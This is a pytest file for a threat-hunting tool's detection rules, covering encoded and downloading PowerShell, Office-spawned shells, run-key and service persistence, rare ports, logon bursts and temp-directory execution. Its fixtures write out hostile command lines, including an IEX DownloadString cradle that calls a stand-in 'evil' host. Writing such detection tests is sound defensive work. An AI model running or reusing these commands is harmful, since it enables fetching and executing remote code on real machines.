"""Detection tests: rules fire on malicious fixtures, stay silent on benign."""

from __future__ import annotations

import io
import json
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

import pytest
from conftest import make_event, make_provenance

from huntforge.cli.main import main as cli_main
from huntforge.detections import (
    DetectionEngine,
    Finding,
    Severity,
    get_rule,
    list_rules,
    select_rules,
)
from huntforge.detections.model import EvidenceRef
from huntforge.models.events import NormalizedEvent
from huntforge.store.db import CaseDB


def run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = cli_main(argv)
    return code, out.getvalue(), err.getvalue()


def run_json(argv: list[str]) -> tuple[int, dict]:
    code, out, _ = run([*argv, "--json"])
    return code, json.loads(out)


def add(db: CaseDB, **overrides) -> int:
    return db.add_event(make_event(**overrides))


def engine_for(db: CaseDB) -> DetectionEngine:
    return DetectionEngine(db.all_events())


def findings_for(db: CaseDB, rule_id: str) -> list[Finding]:
    return engine_for(db).run(rules=[get_rule(rule_id)])


# ---------------------------------------------------------------------------
# Catalog / model
# ---------------------------------------------------------------------------


def test_catalog_has_ten_rules_with_metadata() -> None:
    rules = list_rules()
    assert len(rules) == 10
    ids = [r.id for r in rules]
    assert len(set(ids)) == 10
    for rule in rules:
        assert rule.id.startswith("HF-DET-")
        assert rule.title and rule.description and rule.logic
        assert rule.false_positives and rule.evidence_requirements
        assert rule.version == "0.5.0"
        assert rule.required_sources
        assert isinstance(rule.severity, Severity)


def test_no_rule_emits_critical() -> None:
    assert all(r.severity != Severity.CRITICAL for r in list_rules())


def test_rule_ids_documented() -> None:
    docs = Path(__file__).resolve().parent.parent / "docs" / "DETECTIONS.md"
    text = docs.read_text(encoding="utf-8")
    for rule in list_rules():
        assert rule.id in text, f"{rule.id} missing from DETECTIONS.md"


def test_get_rule_case_insensitive() -> None:
    assert get_rule("hf-det-encpsh").id == "HF-DET-ENCPSH"
    with pytest.raises(KeyError):
        get_rule("HF-DET-NOPE")


def test_select_rules_unknown() -> None:
    with pytest.raises(ValueError, match="HF-DET-NOPE"):
        select_rules(["HF-DET-NOPE"])


def test_severity_parse() -> None:
    level, at_least = Severity.parse("high")
    assert (level, at_least) == (Severity.HIGH, False)
    level, at_least = Severity.parse("HIGH+")
    assert (level, at_least) == (Severity.HIGH, True)
    with pytest.raises(ValueError):
        Severity.parse("extreme")


def test_severity_ordering() -> None:
    assert Severity.LOW.rank() < Severity.HIGH.rank() < Severity.CRITICAL.rank()
    assert Severity.INFORMATIONAL.rank() <= Severity.LOW.rank()


def test_finding_requires_evidence_and_why() -> None:
    ref = EvidenceRef(event_id=1, source="sysmon", source_event_id="1", observation="x")
    with pytest.raises(ValueError):
        Finding(
            rule_id="R",
            rule_version="0.5.0",
            title="t",
            severity=Severity.HIGH,
            confidence=50,
            confidence_reason="r",
            why=[],
            what="w",
            evidence=[ref],
        )
    with pytest.raises(ValueError):
        Finding(
            rule_id="R",
            rule_version="0.5.0",
            title="t",
            severity=Severity.HIGH,
            confidence=50,
            confidence_reason="r",
            why=["y"],
            what="w",
            evidence=[],
        )


# ---------------------------------------------------------------------------
# Rule behavior: malicious fires, benign silent
# ---------------------------------------------------------------------------


def test_encoded_powershell_fires(case_db: CaseDB) -> None:
    add(case_db)  # conftest default: sysmon 1 powershell -enc, flagged
    found = findings_for(case_db, "HF-DET-ENCPSH")
    assert len(found) == 1
    finding = found[0]
    assert finding.severity == Severity.HIGH
    assert finding.confidence == 80
    assert finding.evidence[0].event_id == 1
    assert any("EncodedCommand" in w for w in finding.why)


def test_encoded_powershell_silent_benign(case_db: CaseDB) -> None:
    add(case_db, command_line="powershell.exe -NoProfile Get-Process")
    assert findings_for(case_db, "HF-DET-ENCPSH") == []


def test_powershell_download_fires(case_db: CaseDB) -> None:
    add(
        case_db,
        source="powershell",
        event_id="4104",
        process_name=None,
        command_line=("IEX (New-Object Net.WebClient).DownloadString('http://evil/x')"),
    )
    found = findings_for(case_db, "HF-DET-DLPSH")
    assert len(found) == 1
    assert found[0].severity == Severity.HIGH


def test_powershell_download_silent_benign(case_db: CaseDB) -> None:
    add(
        case_db,
        source="powershell",
        event_id="4104",
        process_name=None,
        command_line="Get-ChildItem C:\\Windows | Select-Object Name",
    )
    assert findings_for(case_db, "HF-DET-DLPSH") == []


def test_office_shell_spawn_fires(case_db: CaseDB) -> None:
    add(case_db)  # winword -> powershell
    found = findings_for(case_db, "HF-DET-OFFICE")
    assert len(found) == 1
    assert "winword" in found[0].what


def test_office_shell_spawn_silent_benign(case_db: CaseDB) -> None:
    add(case_db, parent_name="explorer.exe", process_name="notepad.exe")
    assert findings_for(case_db, "HF-DET-OFFICE") == []


def _runkey(**overrides) -> NormalizedEvent:
    base = dict(
        timestamp="2026-10-02T09:14:55Z",
        source="registry",
        event_id="run-key",
        provenance=make_provenance(),
        host="WS-001",
        registry_key=(
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
        ),
        file_path="C:\\Temp\\evil.exe",
        command_line='"C:\\Temp\\evil.exe" /silent',
        process_name="evil.exe",
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_runkey_medium_without_execution(case_db: CaseDB) -> None:
    case_db.add_event(_runkey())
    found = findings_for(case_db, "HF-DET-RUNKEY")
    assert len(found) == 1
    assert found[0].severity == Severity.MEDIUM
    assert found[0].confidence == 60


def test_runkey_high_with_execution(case_db: CaseDB) -> None:
    case_db.add_event(_runkey())
    add(
        case_db,
        process_name="evil.exe",
        command_line='"C:\\Temp\\evil.exe" /silent',
    )
    found = findings_for(case_db, "HF-DET-RUNKEY")
    assert len(found) == 1
    assert found[0].severity == Severity.HIGH
    assert found[0].confidence == 85


def test_runkey_silent_benign(case_db: CaseDB) -> None:
    add(case_db)  # no registry events at all
    assert findings_for(case_db, "HF-DET-RUNKEY") == []


def test_runkey_sysmon_registry_path(case_db: CaseDB) -> None:
    case_db.add_event(
        _runkey(
            source="sysmon",
            event_id="13",
            file_path=None,
            command_line=None,
            raw='sysmon event 13, details="C:\\Temp\\evil.exe" /silent',
        )
    )
    found = findings_for(case_db, "HF-DET-RUNKEY")
    assert len(found) == 1
    assert "evil.exe" in found[0].what


def _service_event(**overrides) -> NormalizedEvent:
    base = dict(
        timestamp="2026-10-02T09:00:00Z",
        source="services",
        event_id="service",
        provenance=make_provenance(),
        host="WS-001",
        file_path="C:\\Temp\\badsvc.exe",
        command_line="C:\\Temp\\badsvc.exe -k netsvcs",
        process_name="badsvc.exe",
        user="LocalSystem",
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_service_writable_fires(case_db: CaseDB) -> None:
    case_db.add_event(_service_event())
    found = findings_for(case_db, "HF-DET-SVC")
    assert len(found) == 1
    assert found[0].severity == Severity.HIGH


def test_service_writable_silent_benign(case_db: CaseDB) -> None:
    case_db.add_event(
        _service_event(
            file_path="C:\\Windows\\System32\\svchost.exe",
            command_line="C:\\Windows\\System32\\svchost.exe -k netsvcs",
        )
    )
    assert findings_for(case_db, "HF-DET-SVC") == []


def _task_event(**overrides) -> NormalizedEvent:
    base = dict(
        timestamp="2026-10-02T09:00:00Z",
        source="tasks",
        event_id="task",
        provenance=make_provenance(),
        host="WS-001",
        file_path="C:\\Users\\jdoe\\AppData\\Local\\Temp\\updater.exe",
        command_line="C:\\Users\\jdoe\\AppData\\Local\\Temp\\updater.exe",
        process_name="updater.exe",
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_task_writable_fires(case_db: CaseDB) -> None:
    case_db.add_event(_task_event())
    found = findings_for(case_db, "HF-DET-TASK")
    assert len(found) == 1
    assert found[0].severity == Severity.MEDIUM


def test_task_writable_silent_benign(case_db: CaseDB) -> None:
    case_db.add_event(
        _task_event(
            file_path="C:\\Program Files\\App\\app.exe",
            command_line="C:\\Program Files\\App\\app.exe",
        )
    )
    assert findings_for(case_db, "HF-DET-TASK") == []


def test_rare_port_fires_external(case_db: CaseDB) -> None:
    add(
        case_db,
        source="sysmon",
        event_id="3",
        process_name="powershell.exe",
        src_ip="192.168.1.50",
        src_port=52310,
        dst_ip="8.8.8.8",
        dst_port=4444,
    )
    found = findings_for(case_db, "HF-DET-RAREPORT")
    assert len(found) == 1
    assert found[0].severity == Severity.LOW


def test_rare_port_silent_common_and_internal(case_db: CaseDB) -> None:
    add(
        case_db,
        source="sysmon",
        event_id="3",
        dst_ip="203.0.113.44",
        dst_port=443,
    )
    add(
        case_db,
        source="sysmon",
        event_id="3",
        dst_ip="192.168.1.10",
        dst_port=4444,
    )
    assert findings_for(case_db, "HF-DET-RAREPORT") == []


def _logon_4625(minute: int, **overrides) -> NormalizedEvent:
    base = dict(
        timestamp=f"2026-10-02T10:{minute:02d}:00Z",
        source="evtx:Security",
        event_id="4625",
        provenance=make_provenance(),
        host="WS-001",
        user="jdoe",
        src_ip="203.0.113.99",
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_logon_burst_fires(case_db: CaseDB) -> None:
    for minute in range(6):
        case_db.add_event(_logon_4625(minute))
    found = findings_for(case_db, "HF-DET-BRUTE")
    assert len(found) == 1
    assert found[0].severity == Severity.MEDIUM
    assert len(found[0].evidence) == 6


def test_logon_burst_silent_below_threshold(case_db: CaseDB) -> None:
    for minute in range(4):
        case_db.add_event(_logon_4625(minute))
    assert findings_for(case_db, "HF-DET-BRUTE") == []


def test_logon_burst_silent_spread_out(case_db: CaseDB) -> None:
    case_db.add_event(_logon_4625(0))
    case_db.add_event(_logon_4625(0, timestamp="2026-10-02T12:30:00Z"))
    assert findings_for(case_db, "HF-DET-BRUTE") == []


def _logon_4624(ts: str, **overrides) -> NormalizedEvent:
    base = dict(
        timestamp=ts,
        source="evtx:Security",
        event_id="4624",
        provenance=make_provenance(),
        host="WS-001",
        user="CORP\\administrator",
        src_ip="10.0.0.5",
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_admin_new_host_fires(case_db: CaseDB) -> None:
    case_db.add_event(_logon_4624("2026-10-02T08:00:00Z"))
    case_db.add_event(_logon_4624("2026-10-02T09:00:00Z", src_ip="10.0.0.9"))
    found = findings_for(case_db, "HF-DET-ADMINHOST")
    assert len(found) == 1
    assert "10.0.0.9" in found[0].what


def test_admin_new_host_silent_no_baseline(case_db: CaseDB) -> None:
    case_db.add_event(_logon_4624("2026-10-02T08:00:00Z"))
    assert findings_for(case_db, "HF-DET-ADMINHOST") == []


def test_admin_new_host_silent_non_admin(case_db: CaseDB) -> None:
    case_db.add_event(_logon_4624("2026-10-02T08:00:00Z", user="jdoe"))
    case_db.add_event(
        _logon_4624("2026-10-02T09:00:00Z", user="jdoe", src_ip="10.0.0.9")
    )
    assert findings_for(case_db, "HF-DET-ADMINHOST") == []


def test_tempdir_execution_fires(case_db: CaseDB) -> None:
    add(
        case_db,
        process_name="evil.exe",
        command_line='"C:\\Temp\\evil.exe" /silent',
    )
    found = findings_for(case_db, "HF-DET-TEMPEXEC")
    assert len(found) == 1
    assert found[0].severity == Severity.MEDIUM


def test_tempdir_execution_silent_benign(case_db: CaseDB) -> None:
    add(
        case_db,
        process_name="svchost.exe",
        command_line="C:\\Windows\\System32\\svchost.exe -k netsvcs",
    )
    assert findings_for(case_db, "HF-DET-TEMPEXEC") == []


# ---------------------------------------------------------------------------
# Engine behavior
# ---------------------------------------------------------------------------


def test_evidence_chain_references_real_events(case_db: CaseDB) -> None:
    add(case_db)  # intrusion-ish: winword -> powershell -enc
    event_ids = {e["id"] for e in case_db.all_events()}
    for finding in engine_for(case_db).run():
        assert finding.evidence
        for ref in finding.evidence:
            assert ref.event_id in event_ids
        assert finding.why and finding.confidence_reason


def test_engine_sorts_by_severity(case_db: CaseDB) -> None:
    add(case_db)  # high findings
    case_db.add_event(_logon_4624("2026-10-02T08:00:00Z"))
    case_db.add_event(_logon_4624("2026-10-02T09:00:00Z", src_ip="10.0.0.9"))
    findings = engine_for(case_db).run()
    ranks = [f.severity.rank() for f in findings]
    assert ranks == sorted(ranks, reverse=True)


def test_engine_min_severity(case_db: CaseDB) -> None:
    add(case_db)
    findings = engine_for(case_db).run(min_severity=Severity.HIGH)
    assert findings and all(f.severity.rank() >= Severity.HIGH.rank() for f in findings)


def test_applicable_reports_missing_telemetry(case_db: CaseDB) -> None:
    add(case_db)
    applicable = engine_for(case_db).applicable(list_rules())
    assert applicable["HF-DET-ENCPSH"] is True
    assert applicable["HF-DET-SVC"] is False


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def test_cli_detect_exit_1_with_findings(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-1"])[0] == 0
    code, out, _ = run(
        ["ingest", "tests/fixtures/sysmon_intrusion.json", "--case", "DETECT-1"]
    )
    assert code == 0
    code, out, _ = run(["detect", "--case", "DETECT-1"])
    assert code == 1
    assert "finding(s)" in out
    assert "HF-DET-ENCPSH" in out


def test_cli_detect_exit_0_clean(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-2"])[0] == 0
    code, out, _ = run(["detect", "--case", "DETECT-2"])
    assert code == 0
    assert "no findings" in out


def test_cli_detect_rule_filter_and_json(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-3"])[0] == 0
    assert (
        run(["ingest", "tests/fixtures/sysmon_intrusion.json", "--case", "DETECT-3"])[0]
        == 0
    )
    code, data = run_json(["detect", "--case", "DETECT-3", "--rule", "HF-DET-OFFICE"])
    assert code == 1
    assert data["status"] == "warning"
    assert data["data"]["count"] == 1
    finding = data["findings"][0]
    assert finding["rule_id"] == "HF-DET-OFFICE"
    assert finding["evidence"] and finding["why"]
    assert "confidence_reason" in finding


def test_cli_detect_severity_filters(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-4"])[0] == 0
    assert (
        run(["ingest", "tests/fixtures/sysmon_intrusion.json", "--case", "DETECT-4"])[0]
        == 0
    )
    code, data = run_json(["detect", "--case", "DETECT-4", "--severity", "high+"])
    assert code == 1
    assert all(f["severity"] in ("high", "critical") for f in data["findings"])
    code, data = run_json(["detect", "--case", "DETECT-4", "--severity", "low"])
    assert code == 0
    assert data["data"]["count"] == 0


def test_cli_detect_bad_rule_and_severity(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-5"])[0] == 0
    code, _out, err = run(["detect", "--case", "DETECT-5", "--rule", "NOPE"])
    assert code == 2
    code, _out, err = run(["detect", "--case", "DETECT-5", "--severity", "extreme"])
    assert code == 2


def test_cli_detect_explain(isolated_state: Path) -> None:
    assert run(["case", "create", "DETECT-6"])[0] == 0
    assert (
        run(["ingest", "tests/fixtures/sysmon_intrusion.json", "--case", "DETECT-6"])[0]
        == 0
    )
    code, out, _ = run(["detect", "--case", "DETECT-6", "--explain"])
    assert code == 1
    assert "observed:" in out
    assert "inferred (analyst decides):" in out
    assert "confidence:" in out


def test_cli_detect_persists_findings(isolated_state: Path) -> None:
    from huntforge.cases.service import CaseService

    assert run(["case", "create", "DETECT-7"])[0] == 0
    assert (
        run(["ingest", "tests/fixtures/sysmon_intrusion.json", "--case", "DETECT-7"])[0]
        == 0
    )
    assert run(["detect", "--case", "DETECT-7"])[0] == 1
    db = CaseService(isolated_state).open_db("DETECT-7")
    try:
        stored = db.list_findings()
    finally:
        db.close()
    assert len(stored) >= 2
    assert stored[0]["finding_uid"] == "HF-0001"
    assert stored[0]["evidence"]


def test_cli_rules_list(isolated_state: Path) -> None:
    code, out, _ = run(["rules", "list"])
    assert code == 0
    assert "HF-DET-ENCPSH" in out
    code, data = run_json(["rules", "list"])
    assert data["data"]["count"] == 10


def test_cli_detect_unknown_case(isolated_state: Path) -> None:
    code, _out, _err = run(["detect", "--case", "NOPE"])
    assert code == 2
